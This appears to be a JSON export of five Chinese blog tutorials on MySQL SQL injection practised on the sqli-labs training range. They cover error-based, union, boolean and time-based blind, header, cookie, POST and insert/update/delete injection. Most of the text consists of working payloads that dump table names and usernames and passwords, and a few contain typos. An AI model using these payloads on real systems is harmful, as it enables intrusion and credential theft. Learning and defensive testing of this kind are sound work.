[{"title":"基于报错注入","date":"2019-10-20T04:13:25.000Z","path":"2019/10/20/基于报错注入/","text":"适用场景：页面返回错误连接信息 floor报错注入floor()函数，去除小数部分，向下取整 rand()函数,产生0~1的随机数 rand(x)：x对应一个固定的值，但连续多次执行会变化。 floor(rand(0)*2)产生的序列为011011。 原理​ 利用数据库主键不能重复的原理，使用group by分组，产生主键冗余，导致报错 select count(), floor(rand(0)*2) as a from information_schema.tables group by a;这里的group by直接与floor(rand(0)*2)连接，由于floor(rand(0)*2)产生的随机序列为011011，下面就是数据库内的运算 首先建立一张虚拟表： key count(*) 接着进行group by floor(rand(0)*2)。floor表达式第一次运算的值为0，在表中没有找到key为0的数据，故插入，在插入的过程中需要再取一次group by后面的值（即再进行一次floor运算，结果为1），取到了1，将之插入，并将count(\\)置1。* key count(*) 1 1 继续进行group by floor(rand(0)*2),由于这是第三次运算，所以floor(rand(0)*2)的值为1，刚好表中已有key为1的数据，所以直接在count(\\)处加上1即可。* key count(*) 1 2 继续进行group by floor(rand(0)*2)的操作，现在已经是第四次floor运算，所以现在值为0，继续在表中找key为0的数据，发现没有这个数据，所以应当插入一条新的数据，此时重复第一次group by，这时的key值为1,并将count(\\)的值设为1。可是表中现在已经存在key为1的数据，故此时抛出主键冗余的异常。* 靶场演示（sqlilabs靶场第1关） 爆库： id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+ 爆表： id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+ 爆列名： id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+ 爆字段： id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+ Extractvalue报错注入Extractvalue(xml_frag,xpath_expr)函数使用XPath表示法从XML字符串中提取值 ​ xml_frag:目标xml文档 ​ xpath_expr:利用xpath路径法表示的查找路径 原理​ xpath格式语法书写错误会报错 SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;/a/b&#39;) as result; SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;database()&#39;) as result; 靶场演示（sqlilabs靶场第1关） 爆库： id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+ 爆表： id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+ 爆列： id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+ 爆字段： id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+ updatexml报错注入updatexml(XML_document,XPath_String,new_value)函数，返回替换的xml片段 ​ XML_document：XML文档的名称，为string格式 ​ XPath_String：XPath格式的字符串 ​ new_value：替换查找到的符合条件的数据，为string格式 原理​ 同extractvalue报错一样，构造错误的Xpath,以达到报错注入 靶场演示（sqlilabs靶场第1关） 爆库： id=1&#39; and updatexml(1,concat(0x23,version(),user()),1)--+ 爆表： id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+ 爆列： id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)--+ 爆字段： id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"HTTP攻击","date":"2019-10-19T08:40:33.000Z","path":"2019/10/19/HTTP攻击/","text":"HTTP基础： Accept:浏览器能够处理的内容类型 Accept-Charset:浏览器能够显示的字符集 Accept-Encoding:浏览器能够处理的压缩编码 Accept-Language:浏览器当前设置的语言 Connection:浏览器与服务器之间的连接类型 cookie：当前页面设置的任何cookie Host： 发出请求的页面所在的域 Referer:发出请求的页面的URL User-Agent:浏览器的用户代理字符串 Server:WEB服务器表明自己是什么软件及版本信息。例如：server Apache/2.0.61(Unix) HTTP头部注入​ HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。 HTTP头注入常发生在程序采集用户信息的模块中。例如： 1、X-Forwarded-For/client-IP 2、User-Agent 3、Referer 4、Cookie​ cookie注入：COOKIE型注入是通过COOKIE进行数据提交的，其常见的情况有验证登陆、$_REQUEST获取参数。验证登陆是将用户的登陆信息放入COOKIE中来做权限验证的一种方法。 User-Agent头注入​ 与注册登录再注入类似，在登陆后insert语句带入查询，产生注入。构造的payload可以基于多种注入，下面以updatexml()报错为例 sqlilabs靶场第18关 &#39; and updatexnl(1,concat(0x23,database(),0x23),1) and &#39; Referer头注入与UA头注入类似 sqlilabs靶场第19关 &#39; and updatexml(1,concat(0x23,database(),0x23),1) or &#39;# Cookie注入sqlilabs靶场第20关 &#39; and updatexml(1,concat(0x23,database(),0x23),1)# HTTP参数污染攻击​ 在GET和POST的HTTP请求中，经常会出现多个参数的情况。在多个参数相同的情况下，HTTP后端可能有不同的处理方式: 数据库后台数据: sqlilabs靶场第29关 /sqlilabs/Less-29/?id=1&amp;id=3 构造攻击语句 /sqlilabs/Less-29/?id=1&amp;id=3&#39; and updatexml(1,concat(0x23,database(),0x23),1)--+","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"数据库","slug":"数据库","permalink":"https://adad456.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"HTTP","slug":"HTTP","permalink":"https://adad456.github.io/tags/HTTP/"}]},{"title":"POST注入","date":"2019-10-19T03:25:46.000Z","path":"2019/10/19/POST注入/","text":"在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句 数据库中创建一个test的表 create table TEST(id int(3),username varchar(25),password varchar(25),primary key(id))账号登陆通过SQL的‘or’运算符构造万能密码,以sqlilabs靶场的第11关为例 账号：admin&#39; or &#39;1&#39;=&#39;1 密码：随意 在判断出注入点后，可以利用时间注入、布尔注入、报错注入接着获取更多的信息 报错注入： uname=admin&#39; or updatexml(1,concat(0x23,database(),0x23),1)#&amp;&amp;passwd=3421412sds时间注入： uname=admin&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1)#passwd=2142dwq布尔注入： uname=admin&#39; and ascii(substr(database(),1,1)) =115#&amp;&amp;passwd=41234insert注入SQL语句： insert into test(id,username,password) values(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);insert into test values(&#39;4&#39;,&#39;version()&#39;,&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;);insert into test values(&#39;4&#39;,USER(),&#39;c&#39;);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;); 此处的USER()就是构造的payload，单引号闭合会使得payload变成字符串，可以接着获取更多数据库信息 实际中无法知道数据库中表的列数，可以先尝试用数字代替字符串的列（字符串无法代替数字），错误时会插入失败 insert into test values(&#39;1&#39;,2,3,4,5,6,7);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;); insert into test values(&#39;1&#39;,2,3);-- &#39;&#39;,&#39;b&#39;,&#39;c&#39;); update注入SQL语句： update test set name=&#39;shiqi&#39; where id=1; update test set username=&#39;adwdas&#39;,password=&#39;user()&#39; where id=2-- &#39; where id=2; update test set username=&#39;adwdas&#39;,password=user() where id=1-- &#39; where id=1; 与insert类似，除了闭合位置不同，其他的完全一样；此时password处的user()就是构造的攻击语句 delete注入SQL语句： delete from test where id=2; delete from test where id=2 and if(1=1,sleep(5),0); 判断出注入点就可以构造其他的攻击语句，获取更多信息","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"POST注入","slug":"POST注入","permalink":"https://adad456.github.io/tags/POST%E6%B3%A8%E5%85%A5/"}]},{"title":"判断注入点","date":"2019-10-17T14:01:03.000Z","path":"2019/10/17/判断注入点/","text":"union select数字类型​ 查询语句中的参数没有被引号包起来，如id=1（有些闭合参数不使用引号，而使用括号来闭合） payload: id=1&#39; 页面返回错误 id=1+1 或id=3-1 如果存在id=2这条数据，返回结果为真，否者为假 id=1+0 页面返回正常 id=1 and 1=1 页面返回正常 id=1 and 1=2 页面返回错误 id=1 or 1=1 页面返回正常，or使得语句恒为真 id=1 or 1=2 id=-1 xor 1=1 异或，由于xor是短位运算符，必须先使前面的查询语句报错，否者没有结果。页面返回正常 id=1 xor 1=2 页面返回正确 id=1) and (1=1 页面返回正常 id=1 or &#39;ab&#39;=&#39;a&#39;+&#39;b&#39; id=1) or (&#39;ab&#39;=&#39;a&#39;+&#39;b&#39;字符类型​ 查询语句中的参数被引号包起来 payload： id=1&#39; 单引号冲突，查询语句中id=&#39;$id&#39;,再加上一个单引号报错，页面返回错误 id=1&#39;--+ 单引号与后面的注释#抵消，语句正常，页面返回正常 id=1&#39; and &#39;1&#39;=&#39;1 页面返回正常 id=1&#39; and &#39;1&#39;=&#39;2 页面返回错误 id=1&#39; or &#39;1&#39;=&#39;2 or语句恒为真 id=1&#39; or &#39;1&#39;=&#39;1 id=1&#39;) 根据闭合情况测试，查询语句为id=(&#39;$id&#39;)时加上) id=1&quot; 双引号与单引号情况相同盲注布尔盲注​ 页面无报错，有回显 payload: id=1&#39; and (length(database())=8) --+ 当数据库长度为8时，页面返回正常；当数据库长度不为8时，页面返回与正常页面有所差异，页面却不会直接出错 id=1&#39; or (length(databse())&lt;8) --+时间盲注​ 页面无报错，无回显 payload: id=1 and if(1=1,sleep(5),1) 如果页面延迟大于5s,则存在注入点 id=1 and if(1=2,sleep(5),1) 如果页面延迟小于5s,则存在注入点 id=1 or if(1=1，sleep(5),1) 使用or判断时，如果or前面的语句为真，会将数据库中所有数据遍历一遍，花费的时间会特别多 id=1 or if(1=2,sleep(5),1) id=-1 xor if(1=1,sleep(5),1) xor同or id=-1 xor if(1=2,sleep(5),1)基于报错注入​ 页面返回错误连接信息,在正常的地址后尝试判断其他类型注入时，页面会反馈出错误信息 updatexmlpayload: id=1&#39; and updatexml(1,concat(0x23,version(),0x23),1)--+ 如果页面的错误反馈爆出version()的信息，则可以确定存在注入点extractvaluepayload: id=1&#39; and extractvalue(1,concat(0x23,version(),0x23)) --+ 同updatexmlfloorpayload: id=1&#39; and (select 1 from (select count(*),concat(0x23,version(),0x23,floor(rand(0)*2)) as x from imformation_schema.tables group by x) as y) --+ 同updatexml","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"注入点","slug":"注入点","permalink":"https://adad456.github.io/tags/%E6%B3%A8%E5%85%A5%E7%82%B9/"}]},{"title":"获取数据库信息","date":"2019-10-17T08:44:05.000Z","path":"2019/10/17/获取数据库信息/","text":"mysql数据库常用函数: system_user()系统用户名 users()用户名 current_user()当前用户名 session_user()连接数据库的用户名 database() 数据库名 version() MYSQL数据库版本 @@datadir 读取数据库路径 @@basedir MYSQL安装路径 @@version_compile_os 操作系统 concat(str1,str2,str3),返回str1+str2+str3;当有一个字符串为NULL时，即返回NULL concat_ws(separator,str1,str2,str3),返回str1+separator+str2+separator+str3 group_concat（str1,str2,str3）,返回str1+str2+str3; ascii(a)将a转换成其ASCII值 ord(a)将a转换成其ASCII值 left(a,b)从左往右截取字符串a的前b个字符 substr(a,b,c)从b位置开始，截取字符串a的c长度 mid(a,b,c)从位置b开始，截取a字符串的c位 regexp、like语句UNION SELECTunion用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1 查询当前数据库： id=-1&#39; and union select 1,2,database()--+查询所有数据库： id=-1&#39; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+查询表名： id=-1&#39; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+查询列名： id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+查询字段值： id=-1&#39; union select 1,2,group_concat(id,username,password) from users--+基于报错注入updatexml报错注入updatexml(XML_document,XPath_String,new_value) 获取数据库名、版本信息： id=1&#39; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+获取表名： id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+获取列名： id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x23),1)--+获取表users()中的用户名和密码： id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+floor报错注入floor(rand(0)*2) 爆库： id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库 或： id=1&#39; union select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y--+ 或： id=1&#39; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+爆表： id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+爆列名： id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+爆字段值: id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+extractvalue报错注入extractvalue(xml_frag, xpath_expr) 爆库： id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+爆表： id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+爆列名: id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+爆字段： id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+盲注基于布尔的盲注ascii()返回指定字符串最左侧字符的ascii值 count()计算结果集的数量 length()返回指定字符串的长度 substr(str,pos,len) substring(str,pos,len)返回截取的子字符串判断数据库名的长度 id=1&#39; and (length(database())&gt;9) --+ id=1&#39; and (length(database())=9) --+ id=-1&#39; and (length(database())&gt;0) --+猜数据库名 id=1&#39; and (left(database(),1)=&#39;s&#39;)--+从左到右截取一个字符,s对应的ascii值为115 id=1&#39; and ascii(substr(database(),1,1))=115 --+ id=1&#39; and ascii(substr(database(),1,1))&lt;115 --+可以使用‘&lt;’，‘&gt;’来判断 id=1&#39; and (left(database(),2)=&#39;se&#39;)--+从左到右截取两个字符猜当前数据库中表的数量 id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+ id=1&#39; and 4=(select count(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+猜当前数据库中表名的长度 id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),7,1))--+表名的长度即是7-1=6位，这里的limit是取的第一个数据库 id=1&#39; and (length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)=6))--+ id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),7,1))--+ 这里的limit是取的第二个数据库 id=1&#39; and (length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1)=8))--+逐个猜解表名 格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次猜解 id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+对数据库中的第一个表的第一个字符进行ascii的猜解 id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+对数据库中的第一个表的第二个字符进行ascii的猜解猜表中列的数量 id=1&#39; and (select count(column_name) from information_schema.columns where table_name=&#39;users&#39;)=20 --+猜列名的长度 id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1)) --+ id=1&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))=2 --+猜解列名 id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105 --+猜字段数量 id=1&#39; and (select count(username) from security.users)=13 --+猜字段长度 id=1&#39; and length((select username from security.users limit 0,1))=4 --+dump字段的值 id=1&#39; and ascii(substr((select username from security.users limit 0,1),1,1))=67--+ id=1&#39; and ascii(substr((select concat(username,&#39;:&#39;,password) from security.users limit 0,1),1,1))=68--+基于时间的盲注在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解 if(1,2,3)：如果1为True，则执行2，否则执行3 sleep(x)：执行延迟x秒 ascii(char)：将char转换为对应的ascii码 substr(string,start,len)：从string的start位开始截取len个字符 Benchmark(x,1)：执行表达式1，x次（会消耗CPU，慎用）查看信息 id=1&#39; and if(ascii(substr(user(),1,1))=114,sleep(3),1)查看用户名 id=1&#39; and if(ascii(substr(database(),1,1))=114,sleep(3),1)查看数据库 id=1&#39; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版本爆表名 id=-1&#39; and union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1爆列名 id=-1&#39; and union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = &#39;admin&#39; limit 0,1爆数据 id=-1&#39; and union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"数据库","slug":"数据库","permalink":"https://adad456.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}]